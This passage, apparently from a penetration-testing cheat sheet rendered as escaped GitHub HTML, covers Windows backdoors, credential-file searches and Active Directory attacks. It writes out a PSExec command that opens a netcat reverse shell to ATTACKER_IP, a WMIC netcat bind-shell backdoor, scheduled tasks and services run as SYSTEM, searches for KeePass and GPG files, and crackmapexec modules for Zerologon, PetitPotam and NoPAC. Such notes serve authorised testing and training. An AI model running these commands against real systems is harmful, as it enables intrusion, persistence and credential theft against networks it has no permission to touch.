class=\"pl-c\"\u003e#\u003c/span\u003e delete the service\u003c/span\u003e\nsc \\\\VICTIM_NAME delete derp\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.2.2 Backdoor Service with PSExec\u003c/h4\u003e\u003ca id=\"user-content-4622-backdoor-service-with-psexec\" class=\"anchor\" aria-label=\"Permalink: 4.6.2.2 Backdoor Service with PSExec\" href=\"#4622-backdoor-service-with-psexec\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternate way to create a backdoor service. Services give you SYSTEM access.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eNOTE: SysInternals PSExec leaves a copy of the service on the machine after\nyou run it, which you must manually remove with \u003ccode\u003esc \\\\VICTIM_NAME delete psexec\u003c/code\u003e.\nThe Metasploit module and nmap NSE script clean up the service for you.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# '-c' passes copy of command to remote systsem even if not already present\n# '-s' runs command as systsem\n# '-d' runs command in detached mode. Use if you want PSExec to run something\n# in the background (won't wait for process to finish, nor passs input/output\n# back to caller).\npsexec \\\\VICTIM_IP -c -s -d -u Administrator -p password \u0026quot;nc.exe -n ATTACKER_IP -e cmd.exe\u0026quot;\n# If username and password are omitted, psexec uses current user's creds on\n# the remote machine.\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-c' passes copy of command to remote systsem even if not already present\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-s' runs command as systsem\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-d' runs command in detached mode. Use if you want PSExec to run something\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in the background (won't wait for process to finish, nor passs input/output\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e back to caller).\u003c/span\u003e\npsexec \\\\VICTIM_IP \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ed \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu Administrator \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep password \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enc.exe -n ATTACKER_IP -e cmd.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e If username and password are omitted, psexec uses current user's creds on\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the remote machine.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.2.3 Backdoor Scheduled Tasks\u003c/h4\u003e\u003ca id=\"user-content-4623-backdoor-scheduled-tasks\" class=\"anchor\" aria-label=\"Permalink: 4.6.2.3 Backdoor Scheduled Tasks\" href=\"#4623-backdoor-scheduled-tasks\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eScheduled Tasks normally give you Administrator access, but you can use \u003ccode\u003e/ru system\u003c/code\u003e to make them give you SYSTEM access.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# schtasks (\u0026quot;/ru system\u0026quot; runs as system)\nschtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND\n# frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle\n\n# query schtasks\nschtasks /query /s VICTIM_IP\n\n# delete schtask ('/f' to force)\nschtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME\n\n# at (deprecated on newer machines, but still should work)\nat \\\\VICTIM_IP HH:MM[A|P] COMMAND\n\n# query at\nat \\\\VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e schtasks (\"/ru system\" runs as system)\u003c/span\u003e\nschtasks \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ecreate \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etn TASKNAME \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es VICTIM_IP \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eu Administrator \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ep password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esc FREQUENCY \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003est HH:MM:SS \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esd MM\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eDD\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eYYY \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eru system \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etr COMMAND\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e query schtasks\u003c/span\u003e\nschtasks \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003equery \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete schtask ('/f' to force)\u003c/span\u003e\nschtasks \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edelete \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es VICTIM_IP \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eu Administrator \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ep password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etn TASKNAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e at (deprecated on newer machines, but still should work)\u003c/span\u003e\nat \\\\VICTIM_IP HH:MM[\u003cspan class=\"pl-k\"\u003eA\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eP\u003c/span\u003e] COMMAND\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e query at\u003c/span\u003e\nat \\\\VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.3 Backdoor via WMIC\u003c/h3\u003e\u003ca id=\"user-content-463-backdoor-via-wmic\" class=\"anchor\" aria-label=\"Permalink: 4.6.3 Backdoor via WMIC\" href=\"#463-backdoor-via-wmic\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create admin bind-shell backdoor. Use '-d' for it to run without window\nwmic process call create \u0026quot;%temp%\\nc.exe -dlp 22222 -e cmd.exe\u0026quot;\n\n# delete the wmic process\nwmic process where name=\u0026quot;nc.exe\u0026quot; delete\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create admin bind-shell backdoor. Use '-d' for it to run without window\u003c/span\u003e\nwmic \u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e call create \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e%temp%\\nc.exe -dlp 22222 -e cmd.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete the wmic process\u003c/span\u003e\nwmic \u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e name\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enc.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e delete\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.7 Windows Files of Interest\u003c/h2\u003e\u003ca id=\"user-content-47-windows-files-of-interest\" class=\"anchor\" aria-label=\"Permalink: 4.7 Windows Files of Interest\" href=\"#47-windows-files-of-interest\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# GPG keys\ndir /s /b /a C:\\users\\*.gpg\n# usually under C:\\Users\\*\\AppData\\Roaming\\gnupg\\\n\n# KeePass databases:\ndir *.kdb /a /b /s\ndir *.kdbx /a /b /s\npowershell -c \u0026quot;Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\u0026quot;\n\n# XAMPP config files:\npowershell -c \u0026quot;Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\u0026quot;\n# my.ini is MySQL config\n# passwords.txt has default creds\n\n# User files\npowershell -c \u0026quot;Get-ChildItem -Path C:\\Users\\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e GPG keys\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea C:\\users\\\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.gpg\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e usually under C:\\Users\\*\\AppData\\Roaming\\gnupg\\\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e KeePass databases:\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.kdb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\ndir \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.kdbx \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e XAMPP config files:\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e my.ini is MySQL config\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e passwords.txt has default creds\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e User files\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ChildItem -Path C:\\Users\\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5 Active Directory\u003c/h1\u003e\u003ca id=\"user-content-5-active-directory\" class=\"anchor\" aria-label=\"Permalink: 5 Active Directory\" href=\"#5-active-directory\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003eActive Directory (AD)\u003c/em\u003e is how Windows enterprise networks are managed. Everything in the network (computers, users, shares, etc.) is represented in AD as an object. Objects are organized under a hierarchical set of \u003cem\u003eOrganizational Units (OUs)\u003c/em\u003e, which act like folders in a filesystem. The \u003cem\u003eDomain Controller (DC)\u003c/em\u003e is the central server that manages everything, especially access and authentication in the network. The information on the DC gives an attacker full visibility into and control of an AD Domain. The goal is to take over the DC as SYSTEM.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMembers of the \u003cem\u003eDomain Admins\u003c/em\u003e group have administrative privileges on the DC, so they are key targets. Large enterprises group multiple AD domains into a tree, and some go further, grouping trees into an AD forest. \u003cem\u003eEnterprise Admins\u003c/em\u003e have full administrative rights over all DCs in the entire AD forest, and are the most valuable user accounts to compromise.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cem\u003ePrimary Domain Controller (PDC)\u003c/em\u003e is the master, and there can be only one in a domain. It's the one with the \u003cem\u003ePdcRoleOwner\u003c/em\u003e property. This is the best DC to use when querying for domain information because it's the most up-to-date.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003eLightweight Directory Access Protocol (LDAP)\u003c/em\u003e is the protocol used to query and communicate with Active Directory. To communicate to a host (DC) using LDAP, we need to use it's Active Directory Services Path (ADSPath), which looks like:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"LDAP://HostName[:PortNumber][/DistinguishedName]\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eLDAP://HostName[:PortNumber][/DistinguishedName]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWe need three parameters for a full LDAP path: \u003cem\u003eHostName\u003c/em\u003e (hostname, domain name, or IP), \u003cem\u003ePortNumber\u003c/em\u003e (usually defaults are fine), and a \u003cem\u003eDistinguishedName (DN)\u003c/em\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eA DistinguishedName is basically a full domain name, split on periods with \"DC=\", \"OU=\", or \"CN=\" inserted before each component. \"DC\" is the Domain Component, \"OU\" is the Organizational Unit, and \"CN\" is the Common Name (an object identifier). For example: \u003ccode\u003eCN=Stephanie,CN=Users,DC=corp,DC=com\u003c/code\u003e could translate to the domain name \u003ccode\u003estephanie.users.corp.com\u003c/code\u003e. Note that domain names in AD can represent any object in the  AD domain (users included).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIn Windows, \u003cem\u003eActive Directory Services Interface (ADSI)\u003c/em\u003e is a set of COM interfaces that acts as an LDAP provider for programatic communication over LDAP (e.g. via .NET/PowerShell).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWhen trying to access an object (like a share drive) in AD, permissions are managed by \u003cem\u003eAccess Control Lists (ACLs)\u003c/em\u003e, which are composed of \u003cem\u003eAccess Control Entries (ACEs)\u003c/em\u003e. ACEs can be configured to provide many different \u003cstrong\u003epermission types\u003c/strong\u003e. From an attacker perspective, these are the most interesting ones:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cem\u003eGenericAll\u003c/em\u003e: Full permissions over object\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eGenericWrite\u003c/em\u003e: Edit certain attributes of the object\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eWriteOwner\u003c/em\u003e: Change ownership of the object\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eWriteDACL\u003c/em\u003e: Edit ACE's applied to object\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eAllExtendedRights\u003c/em\u003e: Change password, reset password, etc.\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eForceChangePassword\u003c/em\u003e: Password change for object\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eSelf\u003c/em\u003e (Self-Membership): Add ourselves to, for example, a group\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.1 Active Directory Enumeration\u003c/h2\u003e\u003ca id=\"user-content-51-active-directory-enumeration\" class=\"anchor\" aria-label=\"Permalink: 5.1 Active Directory Enumeration\" href=\"#51-active-directory-enumeration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eChecklist:\u003c/p\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Known DC vulnerabilities:\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Zerologon\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e PetitPotam\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e NoPAC (once you have a user's creds)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Kerberoastable accounts\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e AS-REP Roastable accounts\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Find computers where Domain Users can RDP\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Find computers where Domain Users are Local Admin\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Shortest Path to Domain Admins (esp. from Owned Principals)\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Write-permissions on any critical accounts?\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Enumerate:\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Users (interesting permissions)\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Groups (memberships)\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Services (which hosts? users w/ SPNs?)\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Computers (which ones have useful sessions?)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eWhen you start your internal pentest, these are the first modules you should try:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Zerologon\ncrackmapexec smb DC_IP -u '' -p '' -M zerologon\n\n# PetitPotam\ncrackmapexec smb DC_IP -u '' -p '' -M petitpotam\n\n# NoPAC (requires credentials)\ncrackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Zerologon\u003c/span\u003e\ncrackmapexec smb DC_IP -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -M zerologon\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PetitPotam\u003c/span\u003e\ncrackmapexec smb DC_IP -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -M petitpotam\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan 